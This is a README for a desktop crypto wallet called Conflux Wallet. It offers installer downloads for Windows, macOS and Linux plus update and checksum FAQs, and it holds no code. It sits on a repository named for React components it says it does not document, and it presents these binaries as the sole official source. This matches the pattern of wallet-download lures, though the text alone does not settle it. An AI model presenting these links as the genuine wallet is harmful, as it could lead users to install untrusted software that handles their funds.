![Conflux Wallet](assets/banner-profile.png)

<h1 align="center">Conflux Wallet</h1>

<p align="center">Install it, update it, and know which build you are running.</p>

<p align="center"><img src="https://img.shields.io/badge/LICENSE-GPL--3.0-30A0D0?style=for-the-badge&labelColor=101010" alt="License: GPL-3.0"> <img src="https://img.shields.io/badge/RELEASE-v0.6.14-30A0D0?style=for-the-badge&labelColor=101010" alt="Release v0.6.14"></p>

---

## Downloads - v0.6.14

<p align="center"><a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-30A0D0?style=for-the-badge&labelColor=101010&logo=apple" alt="Download for macOS"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-30A0D0?style=for-the-badge&labelColor=101010&logo=linux" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`conflux-wallet-windows-v0.6.14.exe`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe) |
| <img src="https://img.shields.io/badge/MACOS-1B6E93?style=flat-square&labelColor=101010&logo=apple" alt="macOS"> | macOS 12 or later | [`conflux-wallet-macos-v0.6.14.dmg`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg) |
| <img src="https://img.shields.io/badge/LINUX-1B6E93?style=flat-square&labelColor=101010&logo=linux" alt="Linux"> | x64 Ubuntu 20.04 or later, or equivalent | [`conflux-wallet-linux-v0.6.14.zip`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14).

> Only download from this GitHub release page.

---

## Why Conflux Wallet on web3-conflux-react

Most reports that a wallet has stopped working turn out to be a build that is several releases behind. Conflux Wallet is installed software: you download the current installer and install it over the old version, and the accounts, the password and the history stay where they are. There is no silent self-update and no update that arrives by email, pop-up or direct message.

That makes the version the first thing worth checking when something looks wrong, and the download page the only place worth checking it against. A file name that does not match the release, or an installer offered from anywhere else, is the point at which you stop rather than continue.

- A desktop installer for Windows, macOS and Linux, with no browser component.
- Updates installed over the existing build without touching accounts or history.
- The current version and file names published on the release page, and nowhere else.
- No mobile app and no extension: a store listing using this name is not this product.

This repository is one of the Conflux Wallet pages; the installation and update guides linked below carry the steps.

## Who it is for

- You are not sure which build is installed and want the current one without losing accounts.
- The app stopped opening after an update and you need the order of checks.
- You verify downloads and want the checksums in one place rather than in a chat message.

## Your first ten minutes

1. Note the version the app reports before you change anything, so the update has a baseline.
2. Download the current installer for your system from the release page, not from a search result.
3. Close the running app, install over the existing copy, and open it again.
4. Confirm that the accounts, the password and the history are still there; the installer does not replace the key store.
5. Compare the file you downloaded with the SHA-256 values published on the release page.

## What this page covers, and what it does not

This page covers installation, updates and what a version change does to an existing wallet. It does not document this repository's React components or their props, and it is not a changelog: the release page carries the version and the files, and the guides carry the steps. When a build will not open after an update, check the download size against the release page before reinstalling, because a partial download looks like a corrupt application. The release page lists the exact file name and size, and a browser's partial file often carries a different extension.

## Questions before you download

### Does installing a new version delete my accounts?

No. The installer replaces the application and leaves the encrypted key store in place, so accounts and the password remain. The recovery phrase still restores the same accounts elsewhere.

### Where are the checksums?

On the release page, beside the installer files, and in the main application README. This page links there rather than copying values that change with every build.

### Is the macOS or Linux build different from the Windows one?

It is the same wallet packaged for another system, with the same accounts and the same two spaces. The install steps differ, and the platform guide covers each one.

---

## Guides

<div align="center">

| Guide | What it covers |
|---|---|
| [Install Conflux Wallet on Windows](https://github.com/conflux-developments/setup-handbook/blob/HEAD/install-conflux-wallet-on-windows.md) | Install Conflux Wallet on Windows: the checks, in order, for the current desktop release. |
| [Update Conflux Wallet to the Current Release](https://github.com/conflux-developments/setup-handbook/blob/HEAD/update-conflux-wallet-to-latest-release.md) | Update Conflux Wallet to the Current Release: the checks, in order, for the current desktop release. |
| [Verify a Conflux Wallet Download](https://github.com/conflux-developments/setup-handbook/blob/HEAD/verify-conflux-wallet-download.md) | Verify a Conflux Wallet Download: the checks, in order, for the current desktop release. |

</div>

[All Conflux Wallet guides](https://github.com/conflux-developments/setup-handbook/blob/HEAD/README.md)

---

**Security:** download only from this release page, and never share a recovery phrase, private key, password or keystore file with anyone, including support.

## Support

Wallet help: support@confluxwallet.net. Business and legal: office@confluxwallet.net.

## License

GPL-3.0

[Main application](https://github.com/conflux-developments/conflux-desktop-wallet) - [Release v0.6.14](https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14) - [Guide index](https://github.com/conflux-developments/setup-handbook/blob/HEAD/README.md)
